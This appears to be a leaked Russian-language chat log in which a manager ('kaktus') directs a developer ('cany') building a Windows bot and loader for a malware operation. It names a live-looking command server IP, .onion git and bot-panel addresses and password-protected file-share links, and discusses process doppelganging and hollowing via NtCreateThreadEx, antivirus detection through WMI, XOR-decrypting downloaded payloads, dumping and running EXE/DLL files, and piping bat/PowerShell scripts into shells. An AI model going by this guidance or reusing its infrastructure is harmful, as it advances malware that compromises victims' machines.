Timestamp	From	To	Message
2020-09-10 10:22:18.335388	kaktus	cany	Привет!
2020-09-12 15:57:54.979807	cany	kaktus	трафик почему-то не проксируется
2020-09-12 15:58:02.086603	cany	kaktus	и не получается сделать git clone
2020-09-12 15:58:18.857018	cany	kaktus	пишет ошибка резолва
2020-09-12 17:20:28.119816	cany	kaktus	и не получается сделать git clone
2020-09-12 17:20:28.121256	cany	kaktus	трафик почему-то не проксируется
2020-09-12 17:20:28.122622	cany	kaktus	пишет ошибка резолва
2020-09-16 19:36:22.972990	kaktus	cany	Привет!
2020-09-16 19:38:41.838899	kaktus	cany	Тебе нужно будет составить планы работ в ближайшее время - на этой неделе:
2020-09-16 19:41:32.270233	kaktus	cany	1) общий план на весь проект - дополни его с учетом обоих ТЗ и файла "01. дополнение к ТЗ.txt" и оцени примерные сроки на все
2020-09-16 19:43:08.395853	kaktus	cany	2) более подробный план на ближайшие 1-2 недели
2020-09-16 19:44:19.570722	kaktus	cany	включай также в план помимо разработки - изучение методов/технологий
2020-09-16 19:50:45.474540	cany	kaktus	Привет!
2020-09-16 19:50:45.475833	cany	kaktus	Тебе нужно будет составить планы работ в ближайшее время - на этой неделе:
2020-09-16 19:50:45.476647	cany	kaktus	1) общий план на весь проект - дополни его с учетом обоих ТЗ и файла "01. дополнение к ТЗ.txt" и оцени примерные сроки на все
2020-09-16 19:50:45.477422	cany	kaktus	2) более подробный план на ближайшие 1-2 недели
2020-09-16 19:50:45.478191	cany	kaktus	включай также в план помимо разработки - изучение методов/технологий
2020-09-20 23:26:24.312519	cany	kaktus	привет
2020-09-20 23:26:38.897667	cany	kaktus	последний командный сервер актуален?
2020-09-20 23:27:03.528311	cany	kaktus	а то сегодня не получилось получить от него какой-либо ответ
2020-09-20 23:27:16.107238	cany	kaktus	и залить свой код тоже не получается
2020-09-20 23:27:26.372023	cany	kaktus	сервер с гитом походу лежит
2020-09-20 23:27:31.530966	cany	kaktus	план я накидал
2020-09-20 23:27:44.021682	cany	kaktus	скинуть во вторник скорее всего смогу
2020-09-21 07:01:35.979067	cany	kaktus	привет
2020-09-21 07:01:35.980754	cany	kaktus	последний командный сервер актуален?
2020-09-21 07:01:35.981794	cany	kaktus	а то сегодня не получилось получить от него какой-либо ответ
2020-09-21 07:01:35.982641	cany	kaktus	и залить свой код тоже не получается
2020-09-21 07:01:35.983387	cany	kaktus	сервер с гитом походу лежит
2020-09-21 07:01:35.984218	cany	kaktus	план я накидал
2020-09-21 07:01:35.985258	cany	kaktus	скинуть во вторник скорее всего смогу
2020-09-22 06:04:54.008629	kaktus	cany	пробуй вот этот адрес: 185.99.2.54
2020-09-22 23:06:02.965391	kaktus	cany	пробуй вот этот адрес: 185.99.2.54
2020-09-24 07:12:20.143883	kaktus	cany	Привет!
2020-09-24 07:12:32.563417	kaktus	cany	1) резервный адрес сервера гит: https://vya52lglt7p65rxz.onion/
2020-09-24 07:12:47.382722	kaktus	cany	учетка таже самая. Используй его, если первый совсем перестанет работать.
2020-09-24 07:13:53.935623	kaktus	cany	2) Не получил от тебя планы работ. Пришли (или продублируй, если уже присылал).
2020-09-24 07:14:59.075462	kaktus	cany	3) Ты писал что по будням на связи с 20:00 МСК, но всю неделю в это время тебя не было. Уточни свой график и пришли мне его.
2020-09-24 22:55:59.323036	kaktus	cany	Привет!
2020-09-24 22:55:59.325223	kaktus	cany	1) резервный адрес сервера гит: https://vya52lglt7p65rxz.onion/
2020-09-24 22:55:59.326433	kaktus	cany	учетка таже самая. Используй его, если первый совсем перестанет работать.
2020-09-24 22:55:59.327400	kaktus	cany	2) Не получил от тебя планы работ. Пришли (или продублируй, если уже присылал).
2020-09-24 22:55:59.328819	kaktus	cany	3) Ты писал что по будням на связи с 20:00 МСК, но всю неделю в это время тебя не было. Уточни свой график и пришли мне его.
2020-09-24 22:59:01.538284	cany	kaktus	Привет, да я действительно на связи с 20:00 по мск, сейчас просто личные проблемы были на этой неделе, за выходные все обязательно наверстаю
2020-09-24 23:05:52.035296	cany	kaktus	от командного сервера получаю not found
2020-09-25 07:01:11.837194	cany	kaktus	Привет, да я действительно на связи с 20:00 по мск, сейчас просто личные проблемы были на этой неделе, за выходные все обязательно наверстаю
2020-09-25 07:01:11.838240	cany	kaktus	от командного сервера получаю not found
2020-09-25 07:19:49.083115	kaktus	cany	командный сервер 185.99.2.54 - на данный момент работает
2020-09-25 07:20:03.166617	kaktus	cany	уточни, какой запрос направляешь и что ожидаешь получить в ответе?
2020-09-25 20:36:31.522348	kaktus	cany	командный сервер 185.99.2.54 - на данный момент работает
2020-09-25 20:36:31.523750	kaktus	cany	уточни, какой запрос направляешь и что ожидаешь получить в ответе?
2020-09-25 21:36:20.491640	cany	kaktus	я пытаюсь отправить запрос на команду GET /%id%/2
2020-09-25 21:37:06.905224	cany	kaktus	как я понял /%id%/2  должно передаваться 3-м параметром в функцию WinHttpOpenRequest
2020-09-25 21:37:28.969119	cany	kaktus	Cookie с группой я в запрос помещаю
2020-09-26 06:24:29.487374	cany	kaktus	я пытаюсь отправить запрос на команду GET /%id%/2
2020-09-26 06:24:29.488566	cany	kaktus	как я понял /%id%/2  должно передаваться 3-м параметром в функцию WinHttpOpenRequest
2020-09-26 06:24:29.489269	cany	kaktus	Cookie с группой я в запрос помещаю
2020-09-26 18:16:36.450805	kaktus	cany	все так
2020-09-26 18:16:41.575554	kaktus	cany	id должен иметь корректный формат, указанный в ТЗ
2020-09-26 18:16:55.829088	kaktus	cany	запросы можно отлаживать в программе Postman
2020-09-26 18:17:30.377326	kaktus	cany	d7Kb4bMa&ks@fkRNso
2020-09-26 18:17:31.566616	kaktus	cany	Download: https://qaz.im/load/KQfTKt/A6Ns5f
Delete: https://qaz.im/index.php?a=delete&q=369478002
2020-09-26 18:17:47.390175	kaktus	cany	вот пример запроса и ответа на него
2020-09-26 18:18:21.032681	kaktus	cany	по запросу бот зарегистрировался в админке, вот ссылка на его карточку: https://scrytnuuszglaugg.onion:4247/testbots/command?id=0000000000000021573362157403129016311834
2020-09-26 18:23:31.664644	kaktus	cany	Что насчет твоих планов работ?
2020-09-26 18:23:37.761573	kaktus	cany	Они нужны срочно. Эта задача в приоритете.
2020-09-26 18:24:17.108337	kaktus	cany	Если не можешь оценить сроки по каким-либо неясным моментам из ТЗ - пришли свои вопросы по этим моментам.
2020-09-27 16:24:18.094714	kaktus	cany	все так
2020-09-27 16:24:18.097459	kaktus	cany	id должен иметь корректный формат, указанный в ТЗ
2020-09-27 16:24:18.098384	kaktus	cany	запросы можно отлаживать в программе Postman
2020-09-27 16:24:18.099109	kaktus	cany	d7Kb4bMa&ks@fkRNso
2020-09-27 16:24:18.099830	kaktus	cany	Download: https://qaz.im/load/KQfTKt/A6Ns5f
Delete: https://qaz.im/index.php?a=delete&q=369478002
2020-09-27 16:24:18.100632	kaktus	cany	вот пример запроса и ответа на него
2020-09-27 16:24:18.101421	kaktus	cany	по запросу бот зарегистрировался в админке, вот ссылка на его карточку: https://scrytnuuszglaugg.onion:4247/testbots/command?id=0000000000000021573362157403129016311834
2020-09-27 16:24:18.102224	kaktus	cany	Что насчет твоих планов работ?
2020-09-27 16:24:18.102997	kaktus	cany	Они нужны срочно. Эта задача в приоритете.
2020-09-27 16:24:18.103739	kaktus	cany	Если не можешь оценить сроки по каким-либо неясным моментам из ТЗ - пришли свои вопросы по этим моментам.
2020-09-27 17:53:17.902147	cany	kaktus	план
2020-09-27 17:53:22.536199	cany	kaktus	a.4Wy8n@n&yMt:3)f
2020-09-27 17:53:34.515102	cany	kaktus	Download: https://qaz.im/load/zd2yKd/b2NEZE
2020-09-27 17:53:37.336624	cany	kaktus	Delete: https://qaz.im/index.php?a=delete&q=743793047
2020-09-27 19:19:18.765670	cany	kaktus	план
2020-09-27 19:19:18.768537	cany	kaktus	a.4Wy8n@n&yMt:3)f
2020-09-27 19:19:18.772446	cany	kaktus	Download: https://qaz.im/load/zd2yKd/b2NEZE
2020-09-27 19:19:18.773289	cany	kaktus	Delete: https://qaz.im/index.php?a=delete&q=743793047
2020-09-28 19:43:54.559484	cany	kaktus	привет
2020-09-29 18:22:16.557418	kaktus	cany	у тебя давно гит не обновлялся
2020-09-29 18:22:27.828005	kaktus	cany	залей в кротчайшие сроки все свои коммиты
2020-09-29 19:40:02.189747	kaktus	cany	у тебя давно гит не обновлялся
2020-09-29 19:40:02.191383	kaktus	cany	залей в кротчайшие сроки все свои коммиты
2020-09-29 23:15:37.018565	cany	kaktus	упорно не работает допел
2020-09-29 23:15:59.434340	cany	kaktus	падает там же на NtCreateThreadEx
2020-09-29 23:16:07.171906	cany	kaktus	без всяких ошибок
2020-09-29 23:16:32.618644	cany	kaktus	и реализация, которую ты мне скинул так же
2020-09-29 23:16:40.787011	cany	kaktus	и на 10 и на 7 x64
2020-09-30 05:46:22.461876	cany	kaktus	упорно не работает допел
2020-09-30 05:46:22.462900	cany	kaktus	падает там же на NtCreateThreadEx
2020-09-30 05:46:22.463833	cany	kaktus	без всяких ошибок
2020-09-30 05:46:22.464662	cany	kaktus	и реализация, которую ты мне скинул так же
2020-09-30 05:46:22.465585	cany	kaktus	и на 10 и на 7 x64
2020-09-30 05:47:31.467212	kaktus	cany	проверяешь с выключенным АВ?
2020-09-30 06:18:22.980049	kaktus	cany	у NtCreateThreadEx какой код вовзрата?
2020-09-30 18:11:48.523357	kaktus	cany	k8Gb#vZMck7ajRvS
2020-09-30 18:11:49.850496	kaktus	cany	Download: https://qaz.im/load/K9kst9/H6T3nQ
Delete: https://qaz.im/index.php?a=delete&q=1221643799
2020-09-30 18:12:04.885788	kaktus	cany	посмотри такую реализацию, это 100% рабочий вариант
2020-09-30 18:14:06.844144	kaktus	cany	проверяешь с выключенным АВ?
2020-09-30 18:14:06.845553	kaktus	cany	у NtCreateThreadEx какой код вовзрата?
2020-09-30 18:14:06.846817	kaktus	cany	k8Gb#vZMck7ajRvS
2020-09-30 18:14:06.847671	kaktus	cany	Download: https://qaz.im/load/K9kst9/H6T3nQ
Delete: https://qaz.im/index.php?a=delete&q=1221643799
2020-09-30 18:14:06.848579	kaktus	cany	посмотри такую реализацию, это 100% рабочий вариант
2020-09-30 18:14:47.793617	cany	kaktus	да я на чистой виртуалке без АВ и дефендер винды выключил
2020-09-30 18:16:04.754851	cany	kaktus	еще вот в реализациях на гитхабе например
2020-09-30 18:16:19.303145	cany	kaktus	не под x64 написано
2020-09-30 18:16:41.835552	cany	kaktus	там например для адресов используются переменные типа DWORD
2020-09-30 18:16:48.290060	cany	kaktus	когда надо DWORD64
2020-09-30 18:17:08.249690	cany	kaktus	так весь process hollowing переделывать надо было
2020-09-30 18:17:41.319359	kaktus	cany	там дан пример, это poc. Дальше - надо его понять и сделать под себя, так подразумевается
2020-09-30 18:18:15.152469	cany	kaktus	может настройки компилятора надо подстроить
2020-09-30 18:18:27.552484	cany	kaktus	я все отладил до системного вызова
2020-09-30 18:18:36.277211	cany	kaktus	и все без ошибок
2020-09-30 18:18:38.091602	kaktus	cany	так ты увидел это вот
2020-09-30 18:18:40.098330	kaktus	cany	[21:11:49] <kaktus> k8Gb#vZMck7ajRvS 
[21:11:50] <kaktus> Download: https://qaz.im/load/K9kst9/H6T3nQ
Delete: https://qaz.im/index.php?a=delete&q=1221643799 
[21:12:05] <kaktus> посмотри такую реализацию, это 100% рабочий вариант
2020-09-30 18:18:45.647259	cany	kaktus	может среда окружения еще плохо настроена
2020-09-30 18:18:57.938234	cany	kaktus	да сейчас смотрю
2020-09-30 18:20:12.995697	kaktus	cany	ну там было 2-3 затыка, это точно. Запомнился только один, что транзакцию надо откатывать после создания потока
2020-09-30 18:20:53.894127	cany	kaktus	понял
2020-09-30 18:21:19.073282	cany	kaktus	а то в большинстве реализаций до
2020-10-02 12:22:12.037913	cany	kaktus	привет
2020-10-02 12:22:33.007385	kaktus	cany	привет
2020-10-02 17:09:38.366979	cany	kaktus	а адрес командного сервера  не изменился?
2020-10-02 17:11:09.510779	cany	kaktus	и домен
2020-10-04 22:23:16.009429	cany	kaktus	сервер не отправляет файл на исполнение
2020-10-04 22:23:32.840078	cany	kaktus	да на отправку инфы о системе
2020-10-04 22:25:10.448757	cany	kaktus	и комиты не доходят
2020-10-04 22:25:21.981601	cany	kaktus	123
2020-10-05 07:04:53.257300	cany	kaktus	сервер не отправляет файл на исполнение
2020-10-05 07:04:53.267706	cany	kaktus	да на отправку инфы о системе
2020-10-05 07:04:53.280107	cany	kaktus	и комиты не доходят
2020-10-05 07:04:53.282346	cany	kaktus	123
2020-10-06 17:38:04.317929	cany	kaktus	привет
2020-10-07 05:03:26.331184	kaktus	cany	1) по поводу кодировки в UTF8 - еще раз посмотри мои последние ответы:
2020-10-07 05:03:31.073713	kaktus	cany	[06.10.2020 21:19:05] <kaktus> так, путаю
[06.10.2020 21:20:02] <kaktus> 1) MultiByteToWideChar(CP_ACP...); 2) WideCharToMultiByte(CP_UTF8...);
[06.10.2020 21:21:49] <kaktus> да, вторым шагом wchar_t* на вход WideCharToMultiByte
2020-10-07 05:04:15.811207	kaktus	cany	вот это вот я ошибся: [06.10.2020 21:18:44] <kaktus> MultiByteToWideChar - в utf8 кодирует юникод, он же widechar. Т.е. ее надо два раза вызывать
2020-10-07 05:09:22.207918	kaktus	cany	2) по поводу кодировки в URLEncode - для данных в формате x-www-form-urlencoded кодируется не все тело целиком, а только имена/значения параметров. То есть:
2020-10-07 05:09:25.329048	kaktus	cany	не так: URLEncode("param1[n1]=value1&param2[n2]=value2...")
2020-10-07 05:09:30.976282	kaktus	cany	а вот так: URLEncode("param1") + "[n]=" + URLEncode("value1") + "&" + URLEncode("param2") + "[n2]=" + URLEncode("value2")...
2020-10-07 05:10:40.257297	kaktus	cany	подробное описание формата данных в RFC 1866, RFC 3986
2020-10-07 17:33:26.645513	kaktus	cany	1) по поводу кодировки в UTF8 - еще раз посмотри мои последние ответы:
2020-10-07 17:33:26.647855	kaktus	cany	[06.10.2020 21:19:05] <kaktus> так, путаю
[06.10.2020 21:20:02] <kaktus> 1) MultiByteToWideChar(CP_ACP...); 2) WideCharToMultiByte(CP_UTF8...);
[06.10.2020 21:21:49] <kaktus> да, вторым шагом wchar_t* на вход WideCharToMultiByte
2020-10-07 17:33:26.648713	kaktus	cany	вот это вот я ошибся: [06.10.2020 21:18:44] <kaktus> MultiByteToWideChar - в utf8 кодирует юникод, он же widechar. Т.е. ее надо два раза вызывать
2020-10-07 17:33:26.649485	kaktus	cany	не так: URLEncode("param1[n1]=value1&param2[n2]=value2...")
2020-10-07 17:33:26.650247	kaktus	cany	а вот так: URLEncode("param1") + "[n]=" + URLEncode("value1") + "&" + URLEncode("param2") + "[n2]=" + URLEncode("value2")...
2020-10-07 17:33:26.651013	kaktus	cany	2) по поводу кодировки в URLEncode - для данных в формате x-www-form-urlencoded кодируется не все тело целиком, а только имена/значения параметров. То есть:
2020-10-07 17:33:26.651811	kaktus	cany	подробное описание формата данных в RFC 1866, RFC 3986
2020-10-08 12:47:20.580065	cany	kaktus	привет
2020-10-08 12:51:29.359661	kaktus	cany	привет
2020-10-08 12:51:50.956081	cany	kaktus	я сделал вот так URLEncode("param1") + "[n]=" + URLEncode("value1") + "&" + URLEncode("param2") + "[n2]=" + URLEncode("value2")
2020-10-08 12:51:58.383556	cany	kaktus	но это не решило проблему как я понял
2020-10-08 12:52:10.111692	cany	kaktus	как у меня сейчас выходит
2020-10-08 12:52:14.776751	cany	kaktus	есть строка
2020-10-08 12:52:23.037914	cany	kaktus	каждый символ кодируется 1 байтом
2020-10-08 12:52:43.469476	cany	kaktus	после перевода в utf-8 каждый символ кодируется 4 байтами
2020-10-08 12:52:55.739650	cany	kaktus	было допустим 17 df
2020-10-08 12:52:59.288178	cany	kaktus	а стало
2020-10-08 12:53:07.762058	cany	kaktus	17 00 00 00 df 00 00 00
2020-10-08 12:53:15.248760	cany	kaktus	те просто дополняется нулями
2020-10-08 12:53:38.212936	cany	kaktus	на сервере я скачиваю файл со своим ответом
2020-10-08 12:53:43.123575	cany	kaktus	там так и приходит
2020-10-08 12:53:49.673327	cany	kaktus	те ответ доходит
2020-10-08 12:54:10.177164	cany	kaktus	но спец символы обратно не расшифровываются
2020-10-08 12:54:19.048185	kaktus	cany	[15:52:43] <asmwardest> после перевода в utf-8 каждый символ кодируется 4 байтами
2020-10-08 12:54:43.306804	kaktus	cany	что-то не так у тебя, в UTF8 символы с кодом 0-127 остаются 1 байт, символы со второй половины кодировки 2-4 байта
2020-10-08 12:55:12.589740	cany	kaktus	ну после той цепочки вызовов
2020-10-08 12:55:33.105549	cany	kaktus	MultiByteToWideChar
2020-10-08 12:55:45.371875	cany	kaktus	первый вызов переводит в wchar
2020-10-08 12:55:50.469692	cany	kaktus	те 2 байта
2020-10-08 12:55:56.033015	cany	kaktus	затем еще раз
2020-10-08 12:56:09.738124	cany	kaktus	кастуя к char вызываю функцию
2020-10-08 12:56:21.479417	cany	kaktus	она еще в два раза увеличивает
2020-10-08 12:56:30.819563	kaktus	cany	[15:55:56] <asmwardest> затем еще раз  - еще раз MultiByteToWideChar ?
2020-10-08 12:56:38.538001	cany	kaktus	да
2020-10-08 12:56:45.951004	cany	kaktus	только с параметром другим
2020-10-08 12:56:49.381211	cany	kaktus	MultiByteToWideChar(CP_ACP
2020-10-08 12:56:49.401356	kaktus	cany	я же тебе написал, что ошибся и правильную последовательность дал
2020-10-08 12:56:53.209717	cany	kaktus	MultiByteToWideChar(CP_UTF8
2020-10-08 12:57:05.837748	kaktus	cany	[06.10.2020 21:20:02] <kaktus> 1) MultiByteToWideChar(CP_ACP...); 2) WideCharToMultiByte(CP_UTF8...);
2020-10-08 12:57:17.600241	cany	kaktus	я так и делаю
2020-10-08 12:57:32.067384	kaktus	cany	вторая функция - WideCharToMultiByte ?
2020-10-08 12:57:47.371725	cany	kaktus	черт
2020-10-08 12:58:02.247030	cany	kaktus	сейчас попробую
2020-10-08 12:58:25.749017	cany	kaktus	невнимательный я
2020-10-08 13:18:31.289642	cany	kaktus	в этом случае ничего не меняется
2020-10-08 13:18:41.016019	cany	kaktus	строка представляется тем же набором байт
2020-10-08 13:19:49.155414	cany	kaktus	но вообще ответ на сервер приходит
2020-10-08 13:19:56.239803	cany	kaktus	вроде почти правильный
2020-10-08 13:28:12.128605	kaktus	cany	если нет национальных символов с кодами 128-255, то строка в UTF8 такая же будет как исходник ANSI, это нормально
2020-10-08 13:28:59.577240	kaktus	cany	данные в отчете должны отображаться по другому, у тебя сейчас вот одна строка: group=WORKGROUP&path=no_(fileless)&os=10019041&os:	
1:
2020-10-08 13:29:13.544523	kaktus	cany	секунду, сейчас покажу
2020-10-08 13:31:08.473278	kaktus	cany	http://prnt.sc/uvht6x
2020-10-08 13:32:52.328124	cany	kaktus	те у меня данные не все доходят?
2020-10-08 13:33:24.289560	kaktus	cany	ты скачай полный результат - кнопочка напротив команды в истории
2020-10-08 13:33:30.318983	kaktus	cany	и сравни с тем образцом который я давал
2020-10-08 13:34:05.651134	kaktus	cany	ну вот у тебя = закодированы в URL, а не должны
2020-10-08 13:34:07.878478	kaktus	cany	поэтому он не парсит
2020-10-08 13:36:12.338445	cany	kaktus	я = только как спец символ кодирую
2020-10-08 13:37:44.181958	kaktus	cany	в ParamName, ParamValue - спецсиволы кодируешь, разделяющие параметры нет
2020-10-08 13:38:56.857896	kaktus	cany	[15:51:51] <asmwardest> я сделал вот так URLEncode("param1") + "[n]=" + URLEncode("value1") + "&" + URLEncode("param2") + "[n2]=" + URLEncode("value2")
2020-10-08 13:39:06.528025	kaktus	cany	именно так и надо, но в отчете твоем последнем не так
2020-10-08 13:55:50.620592	cany	kaktus	получилось
2020-10-08 13:57:54.639862	cany	kaktus	у меня еще вопросы есть по отдельным параметрам в информации
2020-10-08 13:58:05.308709	cany	kaktus	как нормально архитектуру определить?
2020-10-08 13:58:30.478007	cany	kaktus	я получаю инфу типо AMD64
2020-10-08 14:01:26.099892	cany	kaktus	и как антивирусник определять?
2020-10-08 14:40:38.858046	kaktus	cany	по архитектуре вот так будет достаточно:
2020-10-08 14:40:43.690900	kaktus	cany	#ifdef _WIN64
	arch=64
#else
	arch=32
#endif
2020-10-08 14:41:19.349445	cany	kaktus	это не разрядность исполняемого файла?
2020-10-08 14:41:46.982163	kaktus	cany	это соответствует ТЗ в комплексе - на 64-разрядной машине в итоге работает 64-разрядный бот
2020-10-08 14:41:55.838987	cany	kaktus	да
2020-10-08 14:42:07.858527	cany	kaktus	но мне все равно придется определять в загрузчике
2020-10-08 14:43:45.483235	kaktus	cany	а в загрузчике вот так:
2020-10-08 14:43:52.247289	kaktus	cany	#ifndef _WIN64
	IsWow64Process((HANDLE)GetCurrentProcess(), &isWOW64Process);
#endif
2020-10-08 14:46:12.179161	kaktus	cany	по поводу АВ - смотри  WMI/SecurityCenter2
2020-10-08 14:53:58.251532	cany	kaktus	а еще команды net в cmd очень долго выполняются и выдают
2020-10-08 14:53:59.910460	cany	kaktus	Системная ошибка 6118.

Недоступен список серверов для этой рабочей группы.
2020-10-08 14:54:25.184178	kaktus	cany	вот этот результат и отправляй
2020-10-08 14:54:51.636399	cany	kaktus	таким образом не укладываются в таймаут
2020-10-08 14:55:59.211331	kaktus	cany	это нормально, вне домена некоторые эти команды сообщают об ошибке
2020-10-08 14:56:00.771721	cany	kaktus	но только на одну команду уходит секунд 30
2020-10-08 14:56:00.774672	cany	kaktus	не страшно?
2020-10-08 15:01:36.376441	kaktus	cany	таким образом не укладываются в таймаут
2020-10-08 15:01:36.378811	kaktus	cany	но только на одну команду уходит секунд 30
2020-10-08 15:01:36.380161	kaktus	cany	не страшно?
2020-10-08 15:16:45.545196	kaktus	cany	[17:54:20] <kaktus> вот этот результат и отправляй 
[17:55:45] <kaktus> это нормально, вне домена некоторые эти команды сообщают об ошибке
2020-10-08 15:17:12.895057	kaktus	cany	чот не сбоил?
2020-10-08 15:17:17.288910	kaktus	cany	чат*
2020-10-08 15:25:52.107848	cany	kaktus	[17:54:20] <kaktus> вот этот результат и отправляй 
[17:55:45] <kaktus> это нормально, вне домена некоторые эти команды сообщают об ошибке
2020-10-08 15:25:52.109479	cany	kaktus	чот не сбоил?
2020-10-08 15:25:52.110233	cany	kaktus	чат*
2020-10-09 15:37:24.732067	cany	kaktus	привет
2020-10-09 15:45:03.411191	kaktus	cany	привет
2020-10-09 15:45:36.636955	cany	kaktus	при скачивании exe файла кроме расшифрования нужно еще какие-то преобразования делать?
2020-10-09 15:50:39.783311	kaktus	cany	нет, расшифровываешь xor ключем из ID бота
2020-10-09 15:51:41.541278	cany	kaktus	а если запускаем через CreateProcess то дампаем на диск?
2020-10-09 15:51:53.360182	cany	kaktus	и dll тоже
2020-10-09 15:52:25.071600	kaktus	cany	dll всегда дамп на диск, запуск через Create тоже через дамп
2020-10-09 15:52:39.077175	cany	kaktus	как имя генерируется?
2020-10-09 15:53:12.983241	kaktus	cany	файла с дампом?
2020-10-09 15:53:16.395222	cany	kaktus	да
2020-10-09 15:53:36.842886	kaktus	cany	любым удобным способом, можно через GetTempFileName, можно вручную сформировать через rand()
2020-10-09 15:54:00.376685	cany	kaktus	файл удаляется сразу после вызова функции CreateProcess?
2020-10-09 15:56:50.297412	kaktus	cany	зависит от режима запуска, если в фоне - то запустил и забыл. Если с таймаутом - то по завершению/прерыванию дочернего процесса пытаешься удалить
2020-10-09 16:50:41.310111	cany	kaktus	мне еще нужно составить план по неделям
2020-10-09 16:50:50.553221	cany	kaktus	я думал тебе просто сказать примерные сроки
2020-10-09 16:52:53.939930	kaktus	cany	так
2020-10-09 16:53:08.261255	kaktus	cany	мне нужен общий план кратко
2020-10-09 16:53:27.830862	kaktus	cany	просто скажи плановый срок в неделях - сколько еще на бот, и сколько на загрузчик
2020-10-09 16:53:46.781879	kaktus	cany	и второе - пришли подробный план на ближайшие 1-2 недели
2020-10-09 16:56:58.679871	cany	kaktus	exe файл когда я скачиваю другой немного
2020-10-09 16:57:01.212497	cany	kaktus	измененный
2020-10-09 16:57:03.909119	cany	kaktus	про шифрование
2020-10-09 16:57:09.697507	cany	kaktus	я дос заголовок посмотрел
2020-10-09 16:57:13.768582	cany	kaktus	все расшифровалось
2020-10-09 16:57:21.618879	cany	kaktus	я его сохранил
2020-10-09 16:57:27.947665	cany	kaktus	на компе не запускается
2020-10-09 16:57:42.050688	cany	kaktus	и сделал compare в notedap++
2020-10-09 16:57:55.702167	kaktus	cany	в чем различия, частичные?
2020-10-09 17:01:19.983943	cany	kaktus	https://prnt.sc/uwaeg6
2020-10-09 17:01:51.867769	cany	kaktus	справа оригинал
2020-10-09 17:02:11.545556	cany	kaktus	я там в string перекидываю
2020-10-09 17:02:17.291935	cany	kaktus	может потери из-за этого
2020-10-09 17:02:28.791912	cany	kaktus	размер одинаковый
2020-10-09 17:03:35.930985	kaktus	cany	а это файл который в команде RunExe?
2020-10-09 17:03:41.661394	kaktus	cany	или в DownloadFile
2020-10-09 17:04:20.565943	cany	kaktus	RunExe
2020-10-09 17:05:01.242002	cany	kaktus	в строку я перекидываю вот так
2020-10-09 17:05:01.955248	cany	kaktus	WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded);

				if (key != "")
					Decrypt((BYTE*)pszOutBuffer, dwDownloaded, key);
				
				response += string(pszOutBuffer, dwDownloaded);

				delete[] pszOutBuffer;
2020-10-09 17:06:43.352049	kaktus	cany	Decrypt() - учитывает начальную позицию символа в полученном куске?
2020-10-09 17:07:22.680844	kaktus	cany	например, первый кусок у тебя 5 байт - расшифровываешь 1-5 байтами ключа. Второй кусок в 5 байт будет расшифрован 6-10 байтами ключа?
2020-10-09 17:32:14.304748	cany	kaktus	нет
2020-10-09 17:33:25.043602	cany	kaktus	понял
2020-10-10 17:00:03.623401	cany	kaktus	привет
2020-10-10 17:00:17.816944	cany	kaktus	какие ответы должны быть при запуске exe и dll
2020-10-10 17:01:16.344068	cany	kaktus	и если запуск через дамп то в какой директории сохранять?
2020-10-10 17:01:18.709426	kaktus	cany	привет
2020-10-10 17:01:22.436881	kaktus	cany	ты мне пришли отчеты
2020-10-10 17:01:32.465352	kaktus	cany	я уже месфяц их жду
2020-10-10 17:01:40.742875	kaktus	cany	верннеее, планы
2020-10-10 17:01:56.719169	kaktus	cany	план работ*
2020-10-10 17:02:04.394478	cany	kaktus	почему месяц, я ведь присылал уже один раз
2020-10-10 17:02:08.011994	kaktus	cany	так сложно чтоли сделать, пришли мне его
2020-10-10 17:02:52.406256	kaktus	cany	[20:00:17] <asmwardest> какие ответы должны быть при запуске exe и dll
2020-10-10 17:02:57.232091	kaktus	cany	где ответы?
2020-10-10 17:03:08.276722	cany	kaktus	на сервер
2020-10-10 17:03:19.837091	cany	kaktus	после того как я скачал исполняемый файл
2020-10-10 17:03:28.128409	cany	kaktus	я должен что-то ответить серверу?
2020-10-10 17:04:06.994513	kaktus	cany	нет, по ТЗ нет такого
2020-10-10 17:04:18.253673	kaktus	cany	только когда ты выполнил должен отправить ответ
2020-10-10 17:26:58.807044	cany	kaktus	)3&3>[Fb{5(\/:$A+4tA_p]$YXn^Rw
2020-10-10 17:27:38.464242	cany	kaktus	Download: https://qaz.im/load/h2GibB/bEH5RN
Delete: https://qaz.im/index.php?a=delete&q=16435276
2020-10-10 23:20:37.600043	cany	kaktus	)3&3>[Fb{5(\/:$A+4tA_p]$YXn^Rw
2020-10-10 23:20:37.601342	cany	kaktus	Download: https://qaz.im/load/h2GibB/bEH5RN
Delete: https://qaz.im/index.php?a=delete&q=16435276
2020-10-14 17:22:58.695751	cany	kaktus	привет
2020-10-14 17:23:32.988615	kaktus	cany	привет
2020-10-14 17:24:20.032727	cany	kaktus	в тз есть пункт запуск скрипта через канал
2020-10-14 17:24:34.668116	cany	kaktus	это как делается?
2020-10-14 17:25:02.736519	kaktus	cany	данные - тело скрипта надо отправлять через пайп
2020-10-14 17:25:27.421065	cany	kaktus	куда?
2020-10-14 17:28:28.392010	kaktus	cany	для bat: запускаешь cmd.exe с перенаправленными вводом/выводом
2020-10-14 17:28:30.364946	kaktus	cany	то есть с пайпами, во входной пишешь исходный скрипт
2020-10-14 17:28:52.913140	kaktus	cany	в конце добавть "\nexit\n" - так как последняя команда в файле может не выполниться
2020-10-14 17:29:14.343423	kaktus	cany	в powershell также, там он запускается с определенным ключем, в ТЗ это есть
2020-10-14 17:29:48.999635	cany	kaktus	а скрипт писать по командам?
2020-10-14 17:29:51.975416	kaktus	cany	через пайпы - есть ряд ограничений - например, аргументы не удастся передать
2020-10-14 17:29:54.947152	cany	kaktus	или сразу все?
2020-10-14 17:30:25.939966	kaktus	cany	не пишешь кусками с буфером заданного размера
2020-10-14 17:31:02.103602	kaktus	cany	на входе будет скрипт построчно, т.е. команды будут последовательно приниматься разделенные переводом строки и выполняться
2020-10-14 17:32:04.535803	cany	kaktus	когда поступает команда на скачивание
2020-10-14 17:32:09.682984	cany	kaktus	если в пути есть пробелы
2020-10-14 17:32:17.027014	cany	kaktus	в названии директории
2020-10-14 17:33:03.530955	kaktus	cany	так этот вопрос когда-то изучался
2020-10-14 17:33:13.914836	kaktus	cany	а в чем там проблема сейчас?
2020-10-14 17:38:24.458364	cany	kaktus	я этот вопрос впервые задал
2020-10-14 17:38:45.615633	cany	kaktus	ну ладно
2020-10-14 17:38:50.301537	kaktus	cany	в смысле я с веб-кодером раньше обсуждал
2020-10-14 17:39:00.864161	kaktus	cany	у тебя в чем сложность?
2020-10-14 17:39:25.273312	cany	kaktus	пробел как-то экранируется?
2020-10-14 17:39:48.140254	cany	kaktus	ладно я посмотрю сам еще
2020-10-14 17:40:34.681095	kaktus	cany	ты про команду 16 закачка на сервер?
